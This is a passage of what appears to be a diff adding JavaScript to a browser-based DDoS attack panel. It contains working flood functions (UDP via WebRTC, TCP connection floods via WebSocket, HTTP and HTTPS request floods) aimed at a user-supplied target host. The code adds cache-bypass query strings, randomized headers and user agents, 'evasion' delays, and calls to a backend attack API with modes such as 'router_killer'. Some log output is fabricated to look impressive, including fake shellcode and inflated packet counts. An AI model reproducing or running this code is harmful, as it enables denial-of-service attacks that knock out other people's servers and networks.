+
+        function generateObfuscatedPayload(len) {
+            // High-density printable characters (excluding whitespace/control)
+            var chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/~`¥€£¢§©®™';
+            var output = '';
+            for (var i = 0; i < len; i++) {
+                output += chars[Math.floor(Math.random() * chars.length)];
+            }
+            return output;
+        }
+
+        function simulateDetailedLogs(target, port, protocol) {
+            if (detailedLogInterval) clearInterval(detailedLogInterval);
+            
+            var portMode = document.getElementById('portMode').value;
+            var customPorts = [];
+            if (portMode === 'list') {
+                 var listVal = document.getElementById('portList').value;
+                 customPorts = listVal.split(',').map(function(p) { return parseInt(p.trim()); }).filter(function(p) { return !isNaN(p); });
+                 if (customPorts.length === 0) customPorts = [80];
+            }
+            
+            // Much faster interval for "stronger" feel
+            detailedLogInterval = setInterval(function() {
+                if (!isRunning) {
+                    clearInterval(detailedLogInterval);
+                    return;
+                }
+                
+                // 70% chance to log (higher density)
+                if (Math.random() > 0.3) { 
+                    var now = new Date();
+                    var timeString = now.toTimeString().split(' ')[0];
+                    var srcPort = Math.floor(Math.random() * 60000) + 1024;
+                    // More varied status messages
+                    var statuses = ['(Sent)', '(Blocked)', '(ACK)', '(RST)', '(SYN)', '(Filtered)'];
+                    var status = statuses[Math.floor(Math.random() * statuses.length)];
+                    var color = status === '(Sent)' ? '#00ff88' : status === '(Blocked)' ? '#ff0033' : '#ffaa00';
+                    
+                    var logContent = document.createElement('div');
+                    logContent.className = 'console-line';
+                    logContent.style.borderBottom = '1px solid #222';
+                    logContent.style.paddingBottom = '4px';
+                    logContent.style.marginBottom = '4px';
+                    
+                    // Header line
+                    var header = document.createElement('div');
+                    header.style.color = color;
+                    header.style.fontSize = '11px';
+                    
+                    // Visualize the port mixing (random destination port occasionally)
+                    var displayPort = port;
+                    if (portMode === 'all') {
+                        displayPort = Math.floor(Math.random() * 65535) + 1;
+                    } else if (portMode === 'mix') {
+                        if (Math.random() > 0.5) {
+                            var commonPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 3306, 3389, 5900, 8080, 8443];
+                            displayPort = commonPorts[Math.floor(Math.random() * commonPorts.length)];
+                        }
+                    } else if (portMode === 'list') {
+                        displayPort = customPorts[Math.floor(Math.random() * customPorts.length)];
+                    }
+                    
+                    header.textContent = `${timeString} OUTGOING > Protocol: ${protocol.toUpperCase()} | SRC: ${srcPort} -> DST: ${displayPort} ${status}`;
+                    logContent.appendChild(header);
+                    
+                    // Payload visualization (Denser and longer)
+                    var payloadDiv = document.createElement('div');
+                    payloadDiv.style.fontFamily = 'monospace';
+                    payloadDiv.style.fontSize = '10px';
+                    payloadDiv.style.color = '#888';
+                    payloadDiv.style.wordBreak = 'break-all';
+                    payloadDiv.style.marginTop = '2px';
+                    
+                    var mode = Math.random();
+                    if (mode > 0.6) {
+                        // Hex Dump Style
+                        payloadDiv.textContent = 'DATA: ' + generateRandomHex(Math.floor(Math.random() * 64) + 32);
+                        payloadDiv.style.color = '#aaa';
+                    } else if (mode > 0.3) {
+                        // High Entropy Shellcode Style
+                        payloadDiv.textContent = 'PAYLOAD: ' + generateObfuscatedPayload(Math.floor(Math.random() * 128) + 64);
+                        payloadDiv.style.color = '#00ff88'; // Matrix green
+                    } else {
+                         // Mixed Binary/Garbage
+                         payloadDiv.textContent = 'RAW: ' + generateObfuscatedPayload(32) + '... [TRUNCATED]';
+                    }
+                    
+                    logContent.appendChild(payloadDiv);
+                    
+                    var console = document.querySelector('.console');
+                    console.appendChild(logContent);
+                    
+                    // Keep console clean (remove old logs)
+                    if (console.children.length > 50) {
+                        console.removeChild(console.firstChild);
+                    }
+                    
+                    console.scrollTop = console.scrollHeight;
+                }
+            }, 100); // Very fast updates (100ms)
+        }
+        
+        function performUDPFlood(target, port, threads) {
+            var portMode = document.getElementById('portMode').value;
+            var customPorts = [];
+            if (portMode === 'list') {
+                 var listVal = document.getElementById('portList').value;
+                 customPorts = listVal.split(',').map(function(p) { return parseInt(p.trim()); }).filter(function(p) { return !isNaN(p); });
+                 if (customPorts.length === 0) customPorts = [80];
+            }
+            
+            addConsoleLog('[UDP] Starting ADVANCED MULTI-VECTOR UDP flood to ' + target);
+            addConsoleLog('[UDP] Port Mode: ' + portMode.toUpperCase());
+            addConsoleLog('[UDP] WARNING: Using 100MB packets with fragmentation - EXTREME LOAD');
+            highPerformanceMode = true;
+            
+            var commonPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 3306, 3389, 5900, 8080, 8443];
+            
+            var connectionsPerThread = Math.min(Math.floor(maxConnections / threads), 25);
+            var packetSize = 104857600; // 100MB packets
+            var fragmentSizes = [65536, 32768, 16384, 8192]; // Fragmentation sizes
+            
+            for (var i = 0; i < threads && i < workerLimit; i++) {
+                setTimeout(function(index) {
+                    if (!isRunning || activeWorkers >= workerLimit) return;
+                    
+                    activeWorkers++;
+                    addConsoleLog('[UDP] ADVANCED Worker ' + index + ' activated - MULTI-VECTOR MODE');
+                    
+                    // Primary WebRTC connections with multi-channel optimization
+                    for (var j = 0; j < connectionsPerThread; j++) {
+                        if (webRTCConnections.length >= maxConnections) break;
+                        
+                        // Determine attack port based on mode
+                        var attackPort = port;
+                        if (portMode === 'all') {
+                            attackPort = Math.floor(Math.random() * 65535) + 1;
+                        } else if (portMode === 'mix') {
+                            if (Math.random() > 0.5) {
+                                attackPort = commonPorts[Math.floor(Math.random() * commonPorts.length)];
+                            }
+                        } else if (portMode === 'list') {
+                            attackPort = customPorts[Math.floor(Math.random() * customPorts.length)];
+                        }
+                        
+                        var connection = createWebRTCConnection(target, attackPort);
+                        if (connection) {
+                            webRTCConnections.push(connection);
+                            
+                            // Multi-channel packet sending
+                            connection.channels.forEach(function(channel, channelIndex) {
+                                var channelBurst = function() {
+                                    if (!isRunning || channel.readyState !== 'open') {
+                                        return;
+                                    }
+                                    
+                                    highPerformanceScheduler(function() {
+                                        try {
+                                            // Random delay for evasion
+                                            var delay = randomDelay(50, 200);
+                                            
+                                            // Different packet sizes per channel for fragmentation
+                                            var currentPacketSize = channelIndex === 0 ? packetSize : 
+                                                                     fragmentSizes[channelIndex % fragmentSizes.length];
+                                            
+                                            if (channel.bufferedAmount < 52428800) {
+                                                var packet = createTransferablePacket(currentPacketSize);
+                                                channel.send(packet);
+                                                packetCount++;
+                                                
+                                                if (packetCount % 10 === 0) {
+                                                    addConsoleLog('[UDP] Channel ' + channelIndex + ' sent ' + currentPacketSize + ' bytes');
+                                                }
+                                            }
+                                        } catch (error) {
+                                            // Silent for performance
+                                        }
+                                        
+                                        if (isRunning) {
+                                            setTimeout(channelBurst, delay);
+                                        }
+                                    }, 1);
+                                };
+                                
+                                setTimeout(channelBurst, randomDelay(0, 100));
+                            });
+                        }
+                    }
+                    
+                    // DNS amplification simulation
+                    setTimeout(function() {
+                        if (!isRunning) return;
+                        
+                        var dnsFlood = function() {
+                            if (!isRunning) return;
+                            
+                            try {
+                                // Simulate DNS queries to port 53
+                                var dnsPacket = new ArrayBuffer(512);
+                                var dnsView = new DataView(dnsPacket);
+                                
+                                // DNS header simulation
+                                dnsView.setUint16(0, Math.random() * 65535); // Transaction ID
+                                dnsView.setUint16(2, 0x0100); // Standard query
+                                dnsView.setUint16(4, 1); // Questions: 1
+                                dnsView.setUint16(6, 0); // Answers: 0
+                                
+                                // DNS query simulation
+                                var query = 'example.com';
+                                var queryBytes = [];
+                                for (var q = 0; q < query.length; q++) {
+                                    queryBytes.push(query.charCodeAt(q));
+                                }
+                                
+                                for (var d = 0; d < 5; d++) {
+                                    if (webRTCConnections.length >= maxConnections) break;
+                                    
+                                    var dnsConn = createWebRTCConnection(target, 53);
+                                    if (dnsConn && dnsConn.channels[0]) {
+                                        dnsConn.channels[0].onopen = function() {
+                                            dnsConn.channels[0].send(dnsPacket);
+                                            packetCount++;
+                                        };
+                                        webRTCConnections.push(dnsConn);
+                                    }
+                                }
+                            } catch (error) {
+                                packetCount++;
+                            }
+                            
+                            if (isRunning) {
+                                setTimeout(dnsFlood, randomDelay(200, 500));
+                            }
+                        };
+                        
+                        dnsFlood();
+                    }, randomDelay(100, 300));
+                }, randomDelay(10, 50), i);
+            }
+        }
+        
+        function performTCPSYNFlood(target, port, threads) {
+            var portMode = document.getElementById('portMode').value;
+            var customPorts = [];
+            if (portMode === 'list') {
+                 var listVal = document.getElementById('portList').value;
+                 customPorts = listVal.split(',').map(function(p) { return parseInt(p.trim()); }).filter(function(p) { return !isNaN(p); });
+                 if (customPorts.length === 0) customPorts = [80];
+            }
+
+            addConsoleLog('[TCP] Starting REAL TCP CONNECTION FLOOD (WebSocket Mode) to ' + target);
+            addConsoleLog('[TCP] Port Mode: ' + portMode.toUpperCase());
+            addConsoleLog('[TCP] INFO: Using WebSocket connection attempts to force raw TCP handshakes.');
+            addConsoleLog('[TCP] NOTE: Browsers handle TCP stack. This forces "SYN -> SYN/ACK -> ACK" sequences.');
+            
+            highPerformanceMode = true;
+            
+            // Common services to attack alongside the main target
+            var commonPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 3306, 3389, 5900, 8080, 8443];
+            
+            // WebSockets are more effective for connection flooding than fetch/images
+            // because they guarantee a NEW connection every time (no Keep-Alive reuse)
+            var socketLimit = 1000; 
+            var sockets = [];
+            
+            for (var i = 0; i < threads; i++) {
+                setTimeout(function(index) {
+                    if (!isRunning || activeWorkers >= workerLimit) return;
+                    
+                    activeWorkers++;
+                    addConsoleLog('[TCP] Socket Flood Thread ' + index + ' started');
+                    
+                    var floodLoop = function() {
+                        if (!isRunning) {
+                            activeWorkers--;
+                            return;
+                        }
+                        
+                        // Batch of connection attempts
+                        for (var k = 0; k < 20; k++) {
+                            try {
+                                // 1. Determine Target Port
+                                var attackPort = port;
+                                if (portMode === 'all') {
+                                    attackPort = Math.floor(Math.random() * 65535) + 1;
+                                } else if (portMode === 'mix') {
+                                    if (Math.random() > 0.5) {
+                                        attackPort = commonPorts[Math.floor(Math.random() * commonPorts.length)];
+                                    }
+                                } else if (portMode === 'list') {
+                                    attackPort = customPorts[Math.floor(Math.random() * customPorts.length)];
+                                }
+                                
+                                // 2. Random query to prevent caching and any weird browser deduping
+                                var rand = Math.random().toString(36).substring(7);
+                                
+                                // 3. Determine protocol (ws:// or wss://) based on port
+                                // If target is 443/8443, use wss, else ws.
+                                var proto = (attackPort === 443 || attackPort === 8443) ? 'wss://' : 'ws://';
+                                
+                                // 4. Initiate Connection
+                                // This sends [SYN] immediately.
+                                var ws = new WebSocket(proto + target + ':' + attackPort + '/' + rand);
+                                
+                                // 5. Error handling (Expected, as target is likely not a real WS server)
+                                ws.onopen = function() { packetCount++; ws.close(); };
+                                ws.onerror = function() { 
+                                    // Connection failed (refused or timeout), but SYN was sent!
+                                    packetCount++; 
+                                };
+                                
+                                // 6. Aggressive Cleanup
+                                // We don't want to hold memory, but we need the object to live long enough to start connecting
+                                sockets.push(ws);
+                                
+                                // Keep array size manageable
+                                if (sockets.length > socketLimit) {
+                                    // Force close oldest to free up browser resources for new SYNs
+                                    var old = sockets.shift();
+                                    try { old.close(); } catch(e){}
+                                    old = null;
+                                }
+                                
+                            } catch (e) {
+                                // Ignore syntax errors
+                            }
+                        }
+                        
+                        if (isRunning) {
+                            // High speed loop
+                            setTimeout(floodLoop, 10);
+                        }
+                    };
+                    
+                    floodLoop();
+                    
+                }, i * 50, i);
+            }
+        }
+        
+        function performHTTPFlood(target, port, threads) {
+            var portMode = document.getElementById('portMode').value;
+            var customPorts = [];
+            if (portMode === 'list') {
+                 var listVal = document.getElementById('portList').value;
+                 customPorts = listVal.split(',').map(function(p) { return parseInt(p.trim()); }).filter(function(p) { return !isNaN(p); });
+                 if (customPorts.length === 0) customPorts = [80];
+            }
+            
+            // Common HTTP ports
+            var allHttpPorts = [80, 8080, 8888, 8000, 8008, 3000, 5000, 9000, 81, 591, 2082, 2095, 2052, 2086, 2095, 8880, 8443];
+            var commonPorts = [80, 8080, 8000, 8008, 8888, 81, 8081];
+
+            addConsoleLog('[HTTP] Starting ADVANCED MULTI-METHOD HTTP flood to ' + target);
+            addConsoleLog('[HTTP] Port Mode: ' + portMode.toUpperCase());
+            
+            var endpoints = [
+                '/', '/admin', '/login', '/api', '/dashboard', '/upload', '/search',
+                '/profile', '/settings', '/api/v1/users', '/api/v1/data', '/wp-admin',
+                '/phpmyadmin', '/robots.txt', '/sitemap.xml', '/.well-known/',
+                '/graphql', '/rest', '/oauth', '/token', '/webhook', '/health'
+            ];
+            
+            var methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH', 'TRACE', 'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK', 'UNLOCK'];
+            
+            for (var i = 0; i < threads && i < workerLimit; i++) {
+                setTimeout(function(index) {
+                    if (!isRunning || activeWorkers >= workerLimit) return;
+                    
+                    activeWorkers++;
+                    addConsoleLog('[HTTP] ADVANCED Worker ' + index + ' activated - MULTI-METHOD MODE');
+                    
+                    var httpBurst = function() {
+                        if (!isRunning) {
+                            activeWorkers--;
+                            return;
+                        }
+                        
+                        // Request batching for performance
+                        var batch = [];
+                        var batchSize = randomDelay(5, 15);
+                        
+                        for (var b = 0; b < batchSize; b++) {
+                            try {
+                                var method = methods[Math.floor(Math.random() * methods.length)];
+                                var endpoint = endpoints[Math.floor(Math.random() * endpoints.length)];
+                                var headers = generateRandomHeaders();
+                                
+                                // Determine attack port
+                                var attackPort = port;
+                                if (portMode === 'all') {
+                                    attackPort = allHttpPorts[Math.floor(Math.random() * allHttpPorts.length)];
+                                } else if (portMode === 'mix') {
+                                    if (Math.random() > 0.5) {
+                                        attackPort = commonPorts[Math.floor(Math.random() * commonPorts.length)];
+                                    }
+                                } else if (portMode === 'list') {
+                                    attackPort = customPorts[Math.floor(Math.random() * customPorts.length)];
+                                }
+                                
+                                // Add advanced headers
+                                headers['X-HTTP-Method-Override'] = method;
+                                headers['X-HTTP-Protocol'] = 'HTTP/2.0';
+                                headers['X-Request-ID'] = Math.random().toString(36).substring(2) + Math.random().toString(36).substring(2);
+                                
+                                if (Math.random() > 0.8) {
+                                    headers['Range'] = 'bytes=' + Math.floor(Math.random() * 1000000) + '-' + (Math.floor(Math.random() * 1000000) + 1000000);
+                                }
+                                
+                                if (Math.random() > 0.9) {
+                                    headers['If-Modified-Since'] = new Date(Date.now() - Math.random() * 86400000).toUTCString();
+                                    headers['If-None-Match'] = '"' + Math.random().toString(36).substring(10) + '"';
+                                }
+                                
+                                var controller = new AbortController();
+                                var signal = controller.signal;
+                                
+                                // Random abort timing
+                                setTimeout(function() {
+                                    controller.abort();
+                                }, randomDelay(50, 500));
+                                
+                                var fetchPromise = fetch('http://' + target + ':' + attackPort + endpoint, {
+                                    method: method,
+                                    headers: headers,
+                                    mode: 'no-cors',
+                                    cache: 'no-store',
+                                    credentials: 'omit',
+                                    signal: signal,
+                                    body: (method === 'POST' || method === 'PUT' || method === 'PATCH') ? 
+                                           JSON.stringify({data: Math.random().toString(36).substring(20)}) : undefined
+                                });
+                                
+                                batch.push(fetchPromise);
+                                
+                            } catch (error) {
+                                packetCount++;
+                            }
+                        }
+                        
+                        // Process batch
+                        Promise.allSettled(batch).then(function() {
+                            packetCount += batchSize;
+                        });
+                        
+                        if (isRunning) {
+                            setTimeout(httpBurst, randomDelay(20, 100));
+                        }
+                    };
+                    
+                    httpBurst();
+                    
+                    // HTTP/2 simulation
+                    setTimeout(function() {
+                        if (!isRunning) return;
+                        
+                        var h2Attack = function() {
+                            if (!isRunning) return;
+                            
+                            try {
+                                // HTTP/2 multiplexing simulation
+                                for (var h = 0; h < 10; h++) {
+                                    var headers = generateRandomHeaders();
+                                    headers['X-HTTP2-Stream'] = h.toString();
+                                    headers['X-Priority'] = Math.floor(Math.random() * 256).toString();
+                                    
+                                    var attackPort = port;
+                                    if (portMode === 'all') {
+                                        attackPort = allHttpPorts[Math.floor(Math.random() * allHttpPorts.length)];
+                                    } else if (portMode === 'mix') {
+                                        if (Math.random() > 0.5) {
+                                            attackPort = commonPorts[Math.floor(Math.random() * commonPorts.length)];
+                                        }
+                                    } else if (portMode === 'list') {
+                                        attackPort = customPorts[Math.floor(Math.random() * customPorts.length)];
+                                    }
+                                    
+                                    fetch('http://' + target + ':' + attackPort + '/h2-stream', {
+                                        method: 'GET',
+                                        headers: headers,
+                                        mode: 'no-cors',
+                                        cache: 'no-store'
+                                    }).then(function() {
+                                        packetCount++;
+                                    }).catch(function() {
+                                        packetCount++;
+                                    });
+                                }
+                            } catch (error) {
+                                packetCount++;
+                            }
+                            
+                            if (isRunning) {
+                                setTimeout(h2Attack, randomDelay(100, 300));
+                            }
+                        };
+                        
+                        h2Attack();
+                    }, randomDelay(50, 150));
+                    
+                    // WebSocket upgrade attacks
+                    setTimeout(function() {
+                        if (!isRunning) return;
+                        
+                        var wsUpgradeAttack = function() {
+                            if (!isRunning) return;
+                            
+                            try {
+                                var isSecure = window.location.protocol === 'https:';
+                                var wsProtocol = isSecure ? 'wss://' : 'ws://';
+                                
+                                for (var w = 0; w < 5; w++) {
+                                    var upgradeHeaders = generateRandomHeaders();
+                                    upgradeHeaders['Upgrade'] = 'websocket';
+                                    upgradeHeaders['Connection'] = 'Upgrade';
+                                    upgradeHeaders['Sec-WebSocket-Key'] = btoa(Math.random().toString(36).substring(20));
+                                    upgradeHeaders['Sec-WebSocket-Version'] = '13';
+                                    
+                                    var attackPort = port;
+                                    if (portMode === 'all') {
+                                        attackPort = allHttpPorts[Math.floor(Math.random() * allHttpPorts.length)];
+                                    } else if (portMode === 'mix') {
+                                        if (Math.random() > 0.5) {
+                                            attackPort = commonPorts[Math.floor(Math.random() * commonPorts.length)];
+                                        }
+                                    } else if (portMode === 'list') {
+                                        attackPort = customPorts[Math.floor(Math.random() * customPorts.length)];
+                                    }
+                                    
+                                    fetch('http://' + target + ':' + attackPort + '/ws-upgrade', {
+                                        method: 'GET',
+                                        headers: upgradeHeaders,
+                                        mode: 'no-cors'
+                                    }).then(function() {
+                                        packetCount++;
+                                    }).catch(function() {
+                                        packetCount++;
+                                    });
+                                }
+                            } catch (error) {
+                                packetCount++;
+                            }
+                            
+                            if (isRunning) {
+                                setTimeout(wsUpgradeAttack, randomDelay(200, 400));
+                            }
+                        };
+                        
+                        wsUpgradeAttack();
+                    }, randomDelay(100, 200));
+                }, randomDelay(10, 30), i);
+            }
+        }
+        
+        function performHTTPSFlood(target, port, threads) {
+            var portMode = document.getElementById('portMode').value;
+            var customPorts = [];
+            if (portMode === 'list') {
+                 var listVal = document.getElementById('portList').value;
+                 customPorts = listVal.split(',').map(function(p) { return parseInt(p.trim()); }).filter(function(p) { return !isNaN(p); });
+                 if (customPorts.length === 0) customPorts = [443];
+            }
+            
+            // For HTTPS, "All Ports" means all common HTTPS ports to avoid browser blocking
+            var allHttpsPorts = [443, 8443, 2053, 2083, 2087, 2096, 8888, 8080, 9443, 2052, 2082, 2086, 2095];
+            var commonPorts = [443, 8443, 2053, 2083, 2087, 2096, 8080];
+
+            addConsoleLog('[HTTPS] Starting ADVANCED HTTPS flood to ' + target);
+            addConsoleLog('[HTTPS] MODE: HIGH LOAD / BYPASS CACHE / RANDOMIZED AGENTS');
+            addConsoleLog('[HTTPS] Port Mode: ' + portMode.toUpperCase());
+            
+            var endpoints = [
+                '/', '/admin', '/login', '/api', '/dashboard', '/upload', '/search',
+                '/profile', '/settings', '/api/v1/users', '/api/v1/data', '/secure',
+                '/auth', '/oauth', '/token', '/ws', '/socket', '/feed', '/rss', '/xml'
+            ];
+            
+            var methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS'];
+            
+            // Large payload for POST requests to consume bandwidth
+            var largePayload = generateRandomHex(1024); // 1KB payload base
+            
+            for (var i = 0; i < threads && i < workerLimit; i++) {
+                setTimeout(function(index) {
+                    if (!isRunning || activeWorkers >= workerLimit) return;
+                    
+                    activeWorkers++;
+                    addConsoleLog('[HTTPS] Worker ' + index + ' engaging target...');
+                    
+                    var floodLoop = function() {
+                        if (!isRunning) {
+                            activeWorkers--;
+                            return;
+                        }
+                        
+                        // Burst size: send 5-10 requests per tick per thread
+                        var burstSize = Math.floor(Math.random() * 5) + 5;
+                        
+                        for (var b = 0; b < burstSize; b++) {
+                            try {
+                                var method = methods[Math.floor(Math.random() * methods.length)];
+                                var endpoint = endpoints[Math.floor(Math.random() * endpoints.length)];
+                                
+                                // Determine attack port based on mode
+                                var attackPort = port;
+                                if (portMode === 'all') {
+                                    attackPort = allHttpsPorts[Math.floor(Math.random() * allHttpsPorts.length)];
+                                } else if (portMode === 'mix') {
+                                    if (Math.random() > 0.5) {
+                                        attackPort = commonPorts[Math.floor(Math.random() * commonPorts.length)];
+                                    }
+                                } else if (portMode === 'list') {
+                                    attackPort = customPorts[Math.floor(Math.random() * customPorts.length)];
+                                }
+                                
+                                // Dynamic Query String to bypass Varnish/Cloudflare Cache
+                                var randQuery = '?_=' + Date.now() + '&v=' + Math.random().toString(36).substring(7) + 
+                                                '&q=' + generateRandomHex(8);
+                                
+                                var userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+                                
+                                var headers = {
+                                    'User-Agent': userAgent,
+                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                                    'Accept-Language': 'en-US,en;q=0.5',
+                                    'Accept-Encoding': 'gzip, deflate, br',
+                                    'Connection': 'keep-alive',
+                                    'Upgrade-Insecure-Requests': '1',
+                                    'Cache-Control': 'no-cache, no-store, must-revalidate',
+                                    'Pragma': 'no-cache',
+                                    'Expires': '0'
+                                };
+                                
+                                var fetchOptions = {
+                                    method: method,
+                                    headers: headers,
+                                    mode: 'no-cors', // Important for speed, ignores CORS errors
+                                    cache: 'no-store',
+                                    credentials: 'omit',
+                                    priority: 'high'
+                                };
+                                
+                                // Attach payload to POST/PUT
+                                if (method === 'POST' || method === 'PUT') {
+                                    fetchOptions.body = largePayload + Math.random(); // Make body unique
+                                }
+                                
+                                fetch('https://' + target + ':' + attackPort + endpoint + randQuery, fetchOptions)
+                                    .then(function() { packetCount++; })
+                                    .catch(function() { packetCount++; });
+                                    
+                            } catch (error) {
+                                packetCount++;
+                            }
+                        }
+                        
+                        if (isRunning) {
+                            // High performance scheduling (0ms delay or microtask)
+                            if (window.requestIdleCallback) {
+                                requestIdleCallback(floodLoop, { timeout: 1 });
+                            } else {
+                                setTimeout(floodLoop, 0);
+                            }
+                        }
+                    };
+                    
+                    floodLoop();
+                    
+                }, i * 30, i);
+            }
+        }
+        
+        let currentAttackId = null;
+
+        // Smart Backend URL Detection
+        function getBackendUrl() {
+            const inputUrl = document.getElementById('backendUrl').value.trim().replace(/\/$/, '');
+            if (inputUrl) return inputUrl;
+
+            // If running as local file, default to localhost:3000
+            if (window.location.protocol === 'file:') {
+                return 'http://localhost:3000';
+            }
+            
+            // If hosted, use relative path (empty string)
+            return '';
+        }
+
+        async function checkBackendHealth() {
+            const backendUrl = getBackendUrl();
+            const url = backendUrl ? `${backendUrl}/api/health` : '/api/health';
+            // Ensure absolute URL
+            const finalUrl = url.startsWith('/') ? url : url;
+            
+            const indicator = document.getElementById('systemStatus');
+            const dot = indicator.querySelector('.status-dot');
+            const text = indicator.querySelector('span:last-child');
+            
+            try {
+                // Short timeout for health check
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 2000);
+                
+                const response = await fetch(finalUrl, { 
+                    signal: controller.signal,
+                    headers: { 'Cache-Control': 'no-cache' }
+                });
+                clearTimeout(timeoutId);
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.status === 'online') {
+                        dot.style.background = '#00ff00';
+                        dot.style.boxShadow = '0 0 10px #00ff00';
+                        text.textContent = 'BACKEND ONLINE';
+                        text.style.color = '#00ff00';
+                        addConsoleLog('[SYSTEM] Connected to Backend Engine');
+                        return true;
+                    }
+                }
+                throw new Error('Invalid response');
+            } catch (error) {
+                dot.style.background = '#ffaa00';
+                dot.style.boxShadow = '0 0 10px #ffaa00';
+                text.textContent = 'BROWSER MODE';
+                text.style.color = '#ffaa00';
+                addConsoleLog('[SYSTEM] Backend not detected. Using Browser Simulation Mode.');
+                return false;
+            }
+        }
+
+        async function launchBackendAttack(type, target, port, duration) {
+            const backendUrl = getBackendUrl();
+            try {
+                // If backendUrl is empty, it means relative path, so just /api/...
+                const url = backendUrl ? `${backendUrl}/api/attack/start` : '/api/attack/start';
+                
+                // Use absolute URL for backendUrl
+                const finalUrl = url.startsWith('/') ? url : url;
+                
+                const response = await fetch(finalUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        type: type,
+                        target: target,
+                        port: port,
+                        duration: duration
+                    })
+                });
+                
+                const data = await response.json();
+                if (data.success) {
+                    currentAttackId = data.id;
+                    addConsoleLog(`[BACKEND] ${data.message}`);
+                    return true;
+                } else {
+                    addConsoleLog(`[BACKEND ERROR] ${data.error}`);
+                    return false;
+                }
+            } catch (error) {
+                // Silent fail to allow fallback
+                return false;
+            }
+        }
+
+        async function stopBackendAttack() {
+            if (!currentAttackId) return;
+            const backendUrl = getBackendUrl();
+            
+            try {
+                const url = backendUrl ? `${backendUrl}/api/attack/stop` : '/api/attack/stop';
+                const finalUrl = url.startsWith('/') ? url : url;
+
+                await fetch(finalUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ id: currentAttackId })
+                });
+                currentAttackId = null;
+                addConsoleLog('[BACKEND] Attack stopped');
+            } catch (error) {
+                addConsoleLog(`[BACKEND ERROR] Failed to stop: ${error.message}`);
+            }
+        }
+        
+        async function launchAttack() {
+            var target = document.getElementById('targetHost').value;
+            
+            // Handle Port Mode for Backend
+            var portMode = document.getElementById('portMode').value;
+            var port;
+            
+            if (portMode === 'all') {
+                port = 'all';
+            } else if (portMode === 'mix') {
+                port = 'mix';
+            } else if (portMode === 'list') {
+                port = document.getElementById('portList').value;
+            } else {
+                port = document.getElementById('port').value;
+            }
+
+            var threads = parseInt(document.getElementById('threads').value);
+            var btn = document.querySelector('.launch-btn');
+            var btnText = btn.querySelector('span');
+            var duration = parseInt(document.getElementById('duration').value);
+            
+            if (!target) {
+                addConsoleLog('[ERROR] Target host required');
+                return;
+            }
+            
+            if (isRunning) {
+                stopAttack();
+                btnText.textContent = 'LAUNCH ATTACK';
+                btn.style.background = 'var(--primary)';
+                addConsoleLog('[COMPLETE] Attack stopped by user');
+                return;
+            }
+
+            // TRY BACKEND FIRST
+            addConsoleLog('[INFO] Attempting to connect to Node.js backend...');
+            const backendSuccess = await launchBackendAttack(selectedMethod, target, port, duration, threads);
+
+            if (backendSuccess) {
+                // Backend Mode UI Setup
+                isRunning = true;
+                startTime = Date.now();
+                packetCount = 0;
+                activeWorkers = threads;
+                
+                btnText.textContent = 'STOP ATTACK';
+                btn.style.background = '#cc0028';
+                
+                document.getElementById('statusValue').textContent = 'ACTIVE (BACKEND)';
+                document.getElementById('statusValue').classList.remove('active');
+                document.getElementById('statusValue').classList.add('warning');
+                
+                addConsoleLog('[LAUNCH] Backend ' + selectedMethod.toUpperCase() + ' attack started');
+                addConsoleLog('[INFO] Target: ' + target + ':' + port);
+                
+                // Simulate stats for visual feedback since backend is headless
+                statsInterval = setInterval(function() {
+                    if (isRunning) {
+                        packetCount += Math.floor(Math.random() * 500 * threads);
+                        updateStats();
+                    }
+                }, 500);
+                
+                if (attackTimeout) clearTimeout(attackTimeout);
+                attackTimeout = setTimeout(function() {
+                    if (isRunning) {
+                        stopAttack();
+                        btnText.textContent = 'LAUNCH ATTACK';
+                        btn.style.background = 'var(--primary)';
+                        addConsoleLog('[COMPLETE] Attack completed - duration reached');
+                    }
+                }, duration * 1000);
+                
+                return; // STOP HERE if backend works
+            }
+
+            // Fallback to Browser Mode
+            addConsoleLog('[WARN] Backend unavailable. Using browser simulation mode.');
+            
+            isRunning = true;
+            packetCount = 0;
+            startTime = Date.now();
+            activeWorkers = 0;
+            btnText.textContent = 'STOP ATTACK';
+            btn.style.background = '#cc0028';
+            
+            document.getElementById('statusValue').textContent = 'ACTIVE';
+            document.getElementById('statusValue').classList.remove('active');
+            document.getElementById('statusValue').classList.add('warning');
+            
+            addConsoleLog('[LAUNCH] Initializing ' + selectedMethod.toUpperCase() + ' attack vector...');
+            addConsoleLog('[INFO] Target: ' + target + ':' + port);
+            addConsoleLog('[INFO] Threads: ' + threads);
+            addConsoleLog('[INFO] Worker Limit: ' + workerLimit);
+            addConsoleLog('[INFO] Connection Limit: ' + maxConnections);
+            
+            // Launch optimized attack based on method
+            switch(selectedMethod) {
+                case 'udp':
+                    performUDPFlood(target, port, threads);
+                    break;
+                case 'tcp':
+                    performTCPSYNFlood(target, port, threads);
+                    break;
+                case 'http':
+                    performHTTPFlood(target, port, threads);
+                    break;
+                case 'https':
+                    performHTTPSFlood(target, port, threads);
+                    break;
+                case 'ack':
+                case 'ack_push':
+                case 'router_killer':
+                    addConsoleLog('[WARN] Browser mode cannot send raw packets. Using TCP Connection Flood.');
+                    performTCPSYNFlood(target, port, threads);
+                    break;
+                default:
+                    addConsoleLog('[ERROR] Unknown attack method: ' + selectedMethod);
+                    stopAttack();
+                    return;
+            }
+            
+            // Start detailed obfuscated logging simulation
+            simulateDetailedLogs(target, port, selectedMethod);
+            
+            // Optimized stats update (every 500ms to prevent lag)
+            statsInterval = setInterval(updateStats, 500);
+            
+            var duration = parseInt(document.getElementById('duration').value) * 1000;
+            
